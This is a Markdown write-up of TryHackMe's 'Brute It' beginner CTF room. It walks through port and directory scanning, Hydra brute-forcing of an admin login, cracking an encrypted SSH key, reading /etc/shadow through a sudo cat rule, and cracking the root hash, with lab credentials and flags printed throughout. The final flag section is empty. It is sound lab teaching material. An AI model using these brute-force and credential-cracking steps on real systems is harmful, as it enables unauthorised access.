# Brute It

## Summary

[Brute It](https://tryhackme.com/room/bruteit "Brute It CTF on TryHackMe") is a begginer friendly CTF hosted by [TryHackMe](https://tryhackme.com/ "TryHackMe Official Website") and created by [ReddyyZ](https://tryhackme.com/p/ReddyyZ "ReddyyZ Profile On TryHackMe").

This CTF requires basic knowledge of:

* Port scanning with tools like ```nmap```.

* Directory/file scanning with tools like ```gobuster```.

* Examining ```HTML``` source code.

* Examining HTTP requests with tools like ```BurpSuite```.

* Bruteforcing login pages with tools like ```Hydra```.

* Converting a private RSA key into a hash with tools like ```ssh2john```.

* Hash cracking with tools like ```JohnTheRipper```.

* Connecting to a remote server with ```SSH``` using a private key.

* Combining passwd and shadow files with tools like ```unshadow```.

---

## Contents

* [Reconnaissance](#recoinnaissance "Jump To Recoinnassance")

    * [How Many Ports Are Open?](#ports "Jump To Ports")

    * [What Version Of SSH Is Running?](#ssh-version "Jump To SSH Version")

    * [What Version Of Apache Is Running?](#apache-version "Jump To Apache Version")

    * [Which Linux Distribution Is Running?](#linux-distribution "Jump To Linnux Distribution")

    * [What Is The Hidden Directory?](#hidden-directory "Jump To Hidden Directory")

* [Getting A Shell](#getting-a-shell "Jump To Getting A Shell")

    * [What Is The User:Password Of The Admin Panel?](#credentials "Jump To Credentials")

    * [What Is John's RSA Private Key Passphrase?](#rsa-private-key "Jump To RSA Private Key")

    * [User.txt Flag](#usertxt "Jump To User.txt")

    * [Web Flag](#web-flag "Jump To Web Flag")

* [Privilege Escalation](#privilege-escalation "Jump To Privilege Escalation")

    * [What Is The Root's Password?](#roots-password "Jump To Root's Password")

    * [Root.txt Flag](#root-flag "Jump To Root Flag")

---

## Recoinnaissance

### Ports

As always, we start by turning on the target machine and using the ```ping``` command to make sure the machine is up and running.

```
$ ping <IP_Address>

PING <IP_Address> (<IP_Address>) 56(84) bytes of data.
64 bytes from <IP_Address>: icmp_seq=1 ttl=61 time=213 ms
64 bytes from <IP_Address>: icmp_seq=2 ttl=61 time=175 ms
64 bytes from <IP_Address>: icmp_seq=3 ttl=61 time=218 ms
64 bytes from <IP_Address>: icmp_seq=4 ttl=61 time=179 ms
^C
--- <IP_Address> ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3004ms
rtt min/avg/max/mdev = 175.097/195.956/217.527/19.226 ms
```

Once we've verified the machine is active we can move on to a port scan using ```nmap``` in aggressive mode (```-A```). This will return open ports, services, as well as other useful information.

```
$ nmap -A <IP_Address>

Nmap scan report for <IP_Address>
Host is up (0.24s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

After we run a port scan we'll see that we have 2 ports open.

* ```Port 22``` - SSH (Secure Shell)

* ```Port 80``` - HTTP (HyperText Transfer Protocol)

### SSH Version

We can also see, from the results of our port scan above, that the SSH version of the target IP is ```OpenSSH 7.6p1```.

```22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)```

### Apache Version

The port scan also showed us that the version of Apache that is running on the target IP is ```2.4.29```.

```80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))```

### Linux Distribution

We also saw the Linux Distribution on the target IP was ```Ubuntu```.

```|_http-title: Apache2 Ubuntu Default Page: It works```

### Hidden Directory

If we visit the website we found in the port scan we'll be greeted with the "Apache2 Ubuntu Default Page", and viewing the HTML source code reveals nothing of use. So our next step is to use ```GoBuster``` to find hidden directories.

```
$ gobuster -w /path/to/wordlist -u <IP_Address>

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://<IP_Address>/
[+] Threads      : 10
[+] Wordlist     : /path/to/wordlist
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2023/01/18 10:29:23 Starting gobuster
=====================================================
/admin (Status: 301)
```

Almost immediately the scan returns a directory named ```/admin```.

[BACK TO TOP](#brute-it "Jump To Top")

---

## Getting A Shell

### Credentials

Now that we've found the admin login at ```http://<IP_Address>/admin``` we'll need a way to login. We can start by viewing the HTML source code for any hints, where we'll find an interesting comment from one of the developers addressed to "John" reminding him that his username is ```admin```.

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="styles.css">
    <title>Admin Login Page</title>
</head>
<body>
    <div class="main">
        <form action="" method="POST">
            <h1>LOGIN</h1>

            
            <label>USERNAME</label>
            <input type="text" name="user">

            <label>PASSWORD</label>
            <input type="password" name="pass">

            <button type="submit">LOGIN</button>
        </form>
    </div>

    <!-- Hey john, if you do not remember, the username is admin -->
</body>
</html>
```

Armed with this piece of information we can perform a dictionary attack against the login form. But first we'll need to know where and how the names and values get sent to the server, so we'll have to intercept the HTTP request for a failed login with ```BurpSuite```.

```http
POST /admin/ HTTP/1.1
Host: <IP_Address>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 31
Origin: http://<IP_Address>
Connection: close
Referer: http://<IP_Address>/admin/
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
DNT: 1

user=testname&pass=testpassword
```

After we've intercepted the request we'll see that if we try to login with the username ```testname``` and the password ```testpassword``` the server is sent the following...

```user=testname&pass=testpassword```

We'll have to use the ```user``` and ```pass``` names when we craft our Hydra command and replace the values with placeholders. One for admin and one for our wordlist (```user=^USER^&pass=^PASS^```).

Another thing we'll need is the text that appears on the form after a failed login, which in our case is ```Username or password invalid```. Hydra will identify all logins that trigger that line of text as incorrect.

Now that we have the login location, method (```POST```), form names, and incorrect text we can type out the command.

```hydra -l admin -P /path/to/wordlist <IP_Address> http-post-form "/admin/:user=^USER^&pass=^PASS^:F=Username or password invalid"```

After we execute the previous command we should see output similar to the following.

```
[80][http-post-form] host: <IP_Address>   login: admin   password: xavier
1 of 1 target successfully completed, 1 valid password found
```

Now we have the credentials to login, ```admin:xavier```.

### RSA Private Key

Once we login at ```http://<IP_Address>/admin``` we'll be redirected to ```http://<IP_Address>/admin/panel/``` where we'll see the following text...

> Hello john, finish the development of the site, here's your RSA private key.

We'll also see the flag needed for [Web Flag](#web-flag "Jump To Web Flag").

If we click the link we'll be taken to ```http://<IP_Address>/admin/panel/id_rsa``` where we can find [John's private key](./Assets/id_rsa "John's Private RSA Key").

```rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,E32C44CDC29375458A02E94F94B280EA

JCPsentybdCSx8QMOcWKnIAsnIRETjZjz6ALJkX3nKSI4t40y8WfWfkBiDqvxLIm
UrFu3+/UCmXwceW6uJ7Z5CpqMFpUQN8oGUxcmOdPA88bpEBmUH/vD2K/Z+Kg0vY0
BvbTz3VEcpXJygto9WRg3M9XSVsmsxpaAEl4XBN8EmlKAkR+FLj21qbzPzN8Y7bK
HYQ0L43jIulNKOEq9jbI8O1c5YUwowtVlPBNSlzRMuEhceJ1bYDWyUQk3zpVLaXy
+Z3mZtMq5NkAjidlol1ZtwMxvwDy478DjxNQZ7eR/coQmq2jj3tBeKH9AXOZlDQw
UHfmEmBwXHNK82Tp/2eW/Sk8psLngEsvAVPLexeS5QArs+wGPZp1cpV1iSc3AnVB
VOxaB4uzzTXUjP2H8Z68a34B8tMdej0MLHC1KUcWqgyi/Mdq6l8HeolBMUbcFzqA
vbVm8+6DhZPvc4F00bzlDvW23b2pI4RraI8fnEXHty6rfkJuHNVR+N8ZdaYZBODd
/n0a0fTQ1N361KFGr5EF7LX4qKJz2cP2m7qxSPmtZAgzGavUR1JDvCXzyjbPecWR
y0cuCmp8BC+Pd4s3y3b6tqNuharJfZSZ6B0eN99926J5ne7G1BmyPvPj7wb5KuW1
yKGn32DL/Bn+a4oReWngHMLDo/4xmxeJrpmtovwmJOXo5o+UeEU3ywr+sUBJc3W8
oUOXNfQwjdNXMkgVspf8w7bGecucFdmI0sDiYGNk5uvmwUjukfVLT9JPMN8hOns7
onw+9H+FYFUbEeWOu7QpqGRTZYoKJrXSrzII3YFmxE9u3UHLOqqDUIsHjHccmnqx
zRDSfkBkA6ItIqx55+cE0f0sdofXtvzvCRWBa5GFaBtNJhF940Lx9xfbdwOEZzBD
wYZvFv3c1VePTT0wvWybvo0qJTfauB1yRGM1l7ocB2wiHgZBTxPVDjb4qfVT8FNP
f17Dz/BjRDUIKoMu7gTifpnB+iw449cW2y538U+OmOqJE5myq+U0IkY9yydgDB6u
uGrfkAYp6NDvPF71PgiAhcrzggGuDq2jizoeH1Oq9yvt4pn3Q8d8EvuCs32464l5
O+2w+T2AeiPl74+xzkhGa1EcPJavpjogio0E5VAEavh6Yea/riHOHeMiQdQlM+tN
C6YOrVDEUicDGZGVoRROZ2gDbjh6xEZexqKc9Dmt9JbJfYobBG702VC7EpxiHGeJ
mJZ/cDXFDhJ1lBnkF8qhmTQtziEoEyB3D8yiUvW8xRaZGlOQnZWikyKGtJRIrGZv
OcD6BKQSzYoo36vNPK4U7QAVLRyNDHyeYTo8LzNsx0aDbu1rUC+83DyJwUIxOCmd
6WPCj80p/mnnjcF42wwgOVtXduekQBXZ5KpwvmXjb+yoyPCgJbiVwwUtmgZcUN8B
zQ8oFwPXTszUYgNjg5RFgj/MBYTraL6VYDAepn4YowdaAlv3M8ICRKQ3GbQEV6ZC
miDKAMx3K3VJpsY4aV52au5x43do6e3xyTSR7E2bfsUblzj2b+mZXrmxst+XDU6u
x1a9TrlunTcJJZJWKrMTEL4LRWPwR0tsb25tOuUr6DP/Hr52MLaLg1yIGR81cR+W
-----END RSA PRIVATE KEY-----
```

We can crack this private key by using ```ssh2john``` to convert the private key into a hash that ```JohnTheRipper``` can crack.

To check if you already have ```ssh2john``` you can use the ```find``` command.

```find / -type f -name ssh2john.py 2>/dev/null```

If you don't have ```ssh2john``` you'll need to download the [Jumbo version of John](https://github.com/openwall/john "Jumbo John GitHub").

Next, save the private key as [id_rsa](./Assets/id_rsa "John's Private RSA Key") and run ```python /path/to/ssh2john.py /path/to/id_rsa 1> id_rsa.hash```. This will output the hash into a file called ```id_rsa.hash```.

Now that we have the private key hash file we can attempt to crack it with ```JohnTheRipper``` by using the following command...

```john --wordlist=/path/to/wordlist id_rsa.hash```

Once the hash has been cracked we'll find that John's RSA Private Key passphrase is ```rockinroll```.

### user.txt

Now that we have John's private key (```id_rsa```) and his private key's passphrase (```rockinroll```) we can SSH into his account with his private key by using the ```-i``` flag followed by the private key file.

The command should look like this ```ssh -i id_rsa john@<IP_Address>```.

Once prompted for the password we'll use ```rockinroll```.

**IMPORTANT NOTE:** If you get a warning that looks similar to this:

```
$ ssh -i id_rsa john@<IP_Address>
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0664 for 'id_rsa' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key "id_rsa": bad permissions
```

You need to change ```id_rsa```'s permissions so that only you have read and write permissions on the file. This can be done with ```chmod 600 id_rsa```.

Once we've successfully logged in we should see the following...

```
$ ssh -i id_rsa john@<IP_Address>
Enter passphrase for key 'id_rsa': rockinroll

Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-118-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


63 packages can be updated.
0 updates are security updates.

john@bruteit:~$
```

Now we can verify who we are (```whoami```), where we are (```pwd```), and list all contents of the current directory (```ls -la```).


```
john@bruteit:~$ whoami
john

john@bruteit:~$ pwd
/home/john

john@bruteit:~$ ls -la
total 40
drwxr-xr-x 5 john john 4096 Sep 30  2020 .
drwxr-xr-x 4 root root 4096 Aug 28  2020 ..
-rw------- 1 john john  394 Sep 30  2020 .bash_history
-rw-r--r-- 1 john john  220 Aug 16  2020 .bash_logout
-rw-r--r-- 1 john john 3771 Aug 16  2020 .bashrc
drwx------ 2 john john 4096 Aug 16  2020 .cache
drwx------ 3 john john 4096 Aug 16  2020 .gnupg
-rw-r--r-- 1 john john  807 Aug 16  2020 .profile
drwx------ 2 john john 4096 Aug 16  2020 .ssh
-rw-r--r-- 1 john john    0 Aug 16  2020 .sudo_as_admin_successful
-rw-r--r-- 1 root root   33 Aug 16  2020 user.txt
```

Here we can see that the ```user.txt``` file is in John's home directory and if we read it we'll find our flag.

```THM{a_password_is_not_a_barrier}```

### Web Flag

The web flag was found right when we logged in to the admin panel on the website, underneath the link to John's private RSA key.

```THM{brut3_f0rce_is_e4sy}```

[BACK TO TOP](#brute-it "Jump To Top")

---

## Privilege Escalation

### Root's Password

One of the commands we should run as soon as we get into a system is ```sudo -l```, this will list all sudo permissions for the current user.

```
john@bruteit:~$ sudo -l

Matching Defaults entries for john on bruteit:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User john may run the following commands on bruteit:
    (root) NOPASSWD: /bin/cat
```

We can see that the user John has the ability to run the ```cat``` command as sudo without a password. This means we can read any file and naturally the first thing we may want to read is the ```shadow``` file which is where users password hashes are stored.

```
john@bruteit:~$ sudo cat /etc/shadow

root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::
daemon:*:18295:0:99999:7:::
bin:*:18295:0:99999:7:::
sys:*:18295:0:99999:7:::
sync:*:18295:0:99999:7:::
games:*:18295:0:99999:7:::
man:*:18295:0:99999:7:::
lp:*:18295:0:99999:7:::
mail:*:18295:0:99999:7:::
news:*:18295:0:99999:7:::
uucp:*:18295:0:99999:7:::
proxy:*:18295:0:99999:7:::
www-data:*:18295:0:99999:7:::
backup:*:18295:0:99999:7:::
list:*:18295:0:99999:7:::
irc:*:18295:0:99999:7:::
gnats:*:18295:0:99999:7:::
nobody:*:18295:0:99999:7:::
systemd-network:*:18295:0:99999:7:::
systemd-resolve:*:18295:0:99999:7:::
syslog:*:18295:0:99999:7:::
messagebus:*:18295:0:99999:7:::
_apt:*:18295:0:99999:7:::
lxd:*:18295:0:99999:7:::
uuidd:*:18295:0:99999:7:::
dnsmasq:*:18295:0:99999:7:::
landscape:*:18295:0:99999:7:::
pollinate:*:18295:0:99999:7:::
thm:$6$hAlc6HXuBJHNjKzc$NPo/0/iuwh3.86PgaO97jTJJ/hmb0nPj8S/V6lZDsjUeszxFVZvuHsfcirm4zZ11IUqcoB9IEWYiCV.wcuzIZ.:18489:0:99999:7:::
sshd:*:18489:0:99999:7:::
john:$6$iODd0YaH$BA2G28eil/ZUZAV5uNaiNPE0Pa6XHWUFp7uNTp2mooxwa4UzhfC0kjpzPimy1slPNm9r/9soRw8KqrSgfDPfI0:18490:0:99999:7:::
```

We can crack these hashes with ```JohnTheRipper``` again. Copy the output from running ```cat /etc/shadow``` and save the file as [shadow.txt](./Assets/shadow.txt "Shadow File"). In order for the ```john``` tool to crack these hashes we'll need to couple the ```shadow``` file with the ```passwd``` file, so you'll need to copy the output from running the ```cat /etc/passwd``` file and save it as [passwd.txt](./Assets/passwd.txt "Passwd File").

Now that we've got our [shadow.txt](./Assets/shadow.txt "Shadow File") and 
[passwd.txt](./Assets/passwd.txt "Passwd File") files we can couple them together by using the ```unshadow``` tool from ```JohnTheRipper```. We can do this by using the following command...

```unshadow passwd.txt shadow.txt > unshadowed.txt```

This will merge the two files and save the output as [unshadowed.txt](./Assets/unshadowed.txt "Unshadowed Text File") which looks like the following...

```
root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:0:0:root:/root:/bin/bash
daemon:*:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:*:2:2:bin:/bin:/usr/sbin/nologin
sys:*:3:3:sys:/dev:/usr/sbin/nologin
sync:*:4:65534:sync:/bin:/bin/sync
games:*:5:60:games:/usr/games:/usr/sbin/nologin
man:*:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:*:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:*:8:8:mail:/var/mail:/usr/sbin/nologin
news:*:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:*:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:*:13:13:proxy:/bin:/usr/sbin/nologin
www-data:*:33:33:www-data:/var/www:/usr/sbin/nologin
backup:*:34:34:backup:/var/backups:/usr/sbin/nologin
list:*:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:*:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:*:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:*:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:*:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:*:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:*:102:106::/home/syslog:/usr/sbin/nologin
messagebus:*:103:107::/nonexistent:/usr/sbin/nologin
_apt:*:104:65534::/nonexistent:/usr/sbin/nologin
lxd:*:105:65534::/var/lib/lxd/:/bin/false
uuidd:*:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:*:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:*:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:*:109:1::/var/cache/pollinate:/bin/false
thm:$6$hAlc6HXuBJHNjKzc$NPo/0/iuwh3.86PgaO97jTJJ/hmb0nPj8S/V6lZDsjUeszxFVZvuHsfcirm4zZ11IUqcoB9IEWYiCV.wcuzIZ.:1000:1000:THM Room:/home/thm:/bin/bash
sshd:*:110:65534::/run/sshd:/usr/sbin/nologin
john:$6$iODd0YaH$BA2G28eil/ZUZAV5uNaiNPE0Pa6XHWUFp7uNTp2mooxwa4UzhfC0kjpzPimy1slPNm9r/9soRw8KqrSgfDPfI0:1001:1001:john,,,:/home/john:/bin/bash
```

Now we can crack the [unshadowed.txt](./Assets/unshadowed.txt "Unshadowed Text File") file with ```JohnTheRipper```.

```
$ john --wordlist=/path/to/wordlist unshadowed.txt

Loaded 3 password hashes with 3 different salts (crypt, generic crypt(3) [?/64])

Press 'q' or Ctrl-C to abort, almost any other key for status
football         (root)
```

After the hashes have been cracked we can see that the password for root was ```football```.

### Root Flag

---

[BACK TO TOP](#brute-it "Jump To Top")
